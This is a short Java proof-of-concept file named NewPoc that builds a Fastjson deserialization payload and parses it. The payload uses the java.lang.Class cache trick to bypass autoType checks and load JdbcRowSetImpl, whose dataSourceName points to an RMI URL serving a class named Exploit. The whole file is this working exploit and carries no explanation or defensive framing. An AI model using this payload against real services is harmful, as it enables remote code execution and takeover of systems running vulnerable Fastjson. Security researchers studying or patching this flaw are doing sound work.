package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class NewPoc {
    public static void main(String[] argv) {
        String part1 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},";
        String part2 = "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:8899/vul.Exploit\",\"autoCommit\":true}}";
        String payload = part1 + part2;
        //System.out.println(ParserConfig.getGlobalInstance().isAutoTypeSupport());
        JSON.parse(payload);
    }
}